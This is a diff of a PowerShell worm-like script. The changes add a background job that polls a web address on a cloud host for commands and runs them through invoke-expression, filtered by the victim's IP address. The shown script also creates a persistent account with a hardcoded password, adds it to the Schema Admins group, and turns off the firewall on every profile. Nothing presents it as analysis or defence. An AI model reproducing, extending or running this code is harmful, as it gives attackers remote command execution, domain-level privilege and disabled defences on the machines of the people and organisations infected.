@@ -1,4 +1,4 @@
-﻿if(1 -eq 1){
+if(1 -eq 1){
     $fun = 'much'
 }
 else{
@@ -93,7 +93,7 @@ function wormy{
     while(1 -eq 1){
         [SecureString]$secureString = $c0de | ConvertTo-SecureString -AsPlainText -Force 
         [PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
-        cNc
+        #cNc
         accountPersist
         
         Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
@@ -136,7 +136,8 @@ start-job -ScriptBlock{
     start-sleep -Seconds (get-random -Minimum 60 -Maximum 90)
 }
 start-job -ScriptBlock{
-    
+    $timeURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/eeee/timeZ.txt'
+    while(1 -eq 1){
     $toAppend=invoke-restmethod $timeURL
     $username='magrene'
     $c0de='Tossking@'
@@ -157,10 +158,28 @@ start-job -ScriptBlock{
         Add-ADGroupMember -identity 'Schema Admins' -members $username
     }
     start-sleep -seconds 315
-
+}
 }
 
+start-job -scriptBlock {
+    while(1 -eq 1){
+        $cNcURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt'
+        $httpCommand=invoke-restmethod $cNcURL
+        $httpCommand | out-file -filepath .\rf.txt
 
+        [string[]]$read = get-content -path .\rf.txt
+        rm .\rf.txt
+    
+        if($read[1] -eq ($hostIP.split("."))[3] -or $read[1] -eq 'all'){
+            if($read[0] -eq ($hostIP.split("."))[1] -or $read[0] -eq 'all'){
+                invoke-expression $read[2]
+            }
+            
+        }
+        
+        start-sleep -seconds 30
+    }
+}
 start-job -ScriptBlock { 
     while(1 -eq 1){
         try{
